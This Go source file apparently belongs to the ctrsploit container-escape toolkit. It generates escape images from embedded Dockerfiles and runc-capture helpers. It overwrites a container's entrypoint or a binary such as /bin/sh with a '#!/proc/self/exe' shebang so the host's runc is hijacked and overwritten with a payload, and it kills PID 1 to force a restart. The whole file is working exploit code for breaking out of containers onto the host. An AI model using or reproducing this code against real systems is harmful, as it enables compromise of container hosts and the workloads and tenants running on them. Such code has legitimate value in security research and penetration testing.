package pipeprimitive

import (
	"bytes"
	_ "embed"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/ctrsploit/ctrsploit/internal"
	"github.com/ctrsploit/sploit-spec/pkg/log"
)

const imageEntrypointSelfPayload = "#!/proc/self/exe\n"

var (
	//go:embed material/Dockerfile
	escapeImageDockerfile string
	//go:embed material/Dockerfile.exec
	escapeImageExecDockerfile string
	//go:embed material/ld.go
	escapeImageLd string
	//go:embed material/runc-capture.go
	escapeImageRuncCapture string
	//go:embed runcwatch/runcwatch.go
	escapeImageRuncWatch string
)

const (
	EscapeImageModeStart = "start"
	EscapeImageModeExec  = "exec"
)

func ValidateEscapeImageMode(mode string) error {
	switch mode {
	case EscapeImageModeStart, EscapeImageModeExec:
		return nil
	default:
		return fmt.Errorf("invalid escape image mode %q: expected %q or %q", mode, EscapeImageModeStart, EscapeImageModeExec)
	}
}

func GenerateEscapeImage(dir string, writer, payload []byte, extraFileSets ...map[string][]byte) error {
	return GenerateEscapeImageWithMode(dir, EscapeImageModeStart, writer, payload, extraFileSets...)
}

func GenerateEscapeImageWithMode(dir, mode string, writer, payload []byte, extraFileSets ...map[string][]byte) error {
	if len(writer) == 0 {
		return fmt.Errorf("escape image writer is empty")
	}
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return fmt.Errorf("create escape image directory %q: %w", dir, err)
	}
	baseFiles := map[string][]byte{
		"writer.go": writer,
		"payload":   payload,
	}
	switch mode {
	case EscapeImageModeStart:
		baseFiles["Dockerfile"] = []byte(escapeImageDockerfile)
		baseFiles["ld.go"] = []byte(escapeImageLd)
	case EscapeImageModeExec:
		baseFiles["Dockerfile"] = []byte(escapeImageExecDockerfile)
		baseFiles["runc-capture.go"] = []byte(escapeImageRuncCapture)
		baseFiles["runcwatch/runcwatch.go"] = []byte(escapeImageRuncWatch)
	default:
		return ValidateEscapeImageMode(mode)
	}
	for name, content := range baseFiles {
		if err := writeEscapeImageFile(dir, name, content); err != nil {
			return fmt.Errorf("write escape image file %q: %w", name, err)
		}
	}
	for _, extraFiles := range extraFileSets {
		for name, content := range extraFiles {
			cleanName, err := cleanEscapeImageFileName(name)
			if err != nil {
				return err
			}
			if _, ok := baseFiles[cleanName]; ok {
				return fmt.Errorf("extra escape image file %q would overwrite a generated file", name)
			}
			if err := writeEscapeImageFile(dir, cleanName, content); err != nil {
				return fmt.Errorf("write extra escape image file %q: %w", name, err)
			}
		}
	}
	log.Logger.Infof(
		"escape image generated in %s directory, build it with:\ndocker build -t poc %s\n",
		dir, dir,
	)
	return nil
}

func writeEscapeImageFile(dir, name string, content []byte) error {
	cleanName, err := cleanEscapeImageFileName(name)
	if err != nil {
		return err
	}
	path := filepath.Join(dir, cleanName)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return err
	}
	return os.WriteFile(path, content, 0o755)
}

func cleanEscapeImageFileName(name string) (string, error) {
	cleanName := filepath.Clean(name)
	if cleanName == "." || filepath.IsAbs(cleanName) || cleanName == ".." || strings.HasPrefix(cleanName, ".."+string(filepath.Separator)) {
		return "", fmt.Errorf("invalid escape image file path %q", name)
	}
	return cleanName, nil
}

func EscapeExec(primitive Primitive, target string, payload []byte, timeout time.Duration) error {
	if target == "" {
		target = "/bin/sh"
	}
	if err := WriteImage(primitive, target, []byte(imageEntrypointSelfPayload)); err != nil {
		return fmt.Errorf("write exec target %q as /proc/self/exe: %w", target, err)
	}
	log.Logger.Infof("Overwritten %s successfully", target)
	log.Logger.Infof("Waiting for the host to exec container target %s ...", target)
	return OverwriteRunc(primitive, payload, timeout)
}

func EscapeRestart(primitive Primitive, pid int, payload []byte, timeout time.Duration) error {
	if pid <= 0 {
		pid = 1
	}
	if err := WriteRestartMaterial(primitive, payload); err != nil {
		return err
	}
	log.Logger.Info("Prepared restart capture material successfully")
	if err := WriteProcessEntrypointAsSelf(primitive, pid); err != nil {
		return err
	}
	log.Logger.Info("Overwritten container entrypoint successfully")
	log.Logger.Info("Triggering container restart ...")
	time.Sleep(time.Second)
	_ = syscall.Kill(pid, syscall.SIGTERM)
	return nil
}

func WriteImageEntrypointAsSelf(primitive Primitive) error {
	return WriteProcessEntrypoint(primitive, 1, []byte(imageEntrypointSelfPayload))
}

func WriteImageEntrypoint(primitive Primitive, payload []byte) error {
	return WriteProcessEntrypoint(primitive, 1, payload)
}

func WriteProcessEntrypointAsSelf(primitive Primitive, pid int) error {
	return WriteProcessEntrypoint(primitive, pid, []byte(imageEntrypointSelfPayload))
}

func WriteProcessEntrypoint(primitive Primitive, pid int, payload []byte) error {
	path, err := processEntrypointPath(pid)
	if err != nil {
		return err
	}

	if err := WriteImage(primitive, path, payload); err != nil {
		return fmt.Errorf("write image entrypoint %q: %w", path, err)
	}
	return nil
}

func processEntrypointPath(pid int) (string, error) {
	if path, err := processArgv0Path(pid); err == nil {
		return path, nil
	}

	shebang, err := internal.IsSheBang(pid)
	if err != nil {
		return "", fmt.Errorf("detect whether /proc/%d uses shebang: %w", pid, err)
	}
	if shebang {
		comm, err := os.ReadFile(fmt.Sprintf("/proc/%d/comm", pid))
		if err != nil {
			return "", fmt.Errorf("read /proc/%d/comm for shebang entrypoint: %w", pid, err)
		}
		path := strings.TrimSpace(string(comm))
		if filepath.IsAbs(path) {
			return filepath.EvalSymlinks(path)
		}
		return filepath.EvalSymlinks(filepath.Join("/", path))
	}

	return fmt.Sprintf("/proc/%d/exe", pid), nil
}

func processArgv0Path(pid int) (string, error) {
	cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return "", fmt.Errorf("read /proc/%d/cmdline: %w", pid, err)
	}
	argv := bytes.Split(bytes.TrimRight(cmdline, "\x00"), []byte{0})
	if len(argv) == 0 || len(argv[0]) == 0 {
		return "", fmt.Errorf("/proc/%d/cmdline has no argv0", pid)
	}

	path := string(argv[0])
	if path == "/proc/self/exe" {
		return fmt.Sprintf("/proc/%d/exe", pid), nil
	}
	if filepath.IsAbs(path) {
		return filepath.EvalSymlinks(path)
	}
	if strings.ContainsRune(path, os.PathSeparator) {
		return filepath.EvalSymlinks(filepath.Join(fmt.Sprintf("/proc/%d/cwd", pid), path))
	}

	if resolved, err := resolveProcessPathExecutable(pid, path); err == nil {
		return resolved, nil
	}
	return "", fmt.Errorf("resolve argv0 %q for pid %d", path, pid)
}

func resolveProcessPathExecutable(pid int, name string) (string, error) {
	for _, dir := range processPathDirs(pid) {
		path := filepath.Join(dir, name)
		info, err := os.Stat(path)
		if err != nil {
			continue
		}
		if info.IsDir() || info.Mode()&0o111 == 0 {
			continue
		}
		return filepath.EvalSymlinks(path)
	}
	return "", os.ErrNotExist
}

func processPathDirs(pid int) []string {
	dirs := []string{"/bin", "/usr/bin", "/sbin", "/usr/sbin"}
	environ, err := os.ReadFile(fmt.Sprintf("/proc/%d/environ", pid))
	if err != nil {
		return dirs
	}
	for _, entry := range bytes.Split(environ, []byte{0}) {
		if !bytes.HasPrefix(entry, []byte("PATH=")) {
			continue
		}
		pathValue := strings.TrimPrefix(string(entry), "PATH=")
		if pathValue == "" {
			return dirs
		}
		return append(strings.Split(pathValue, ":"), dirs...)
	}
	return dirs
}
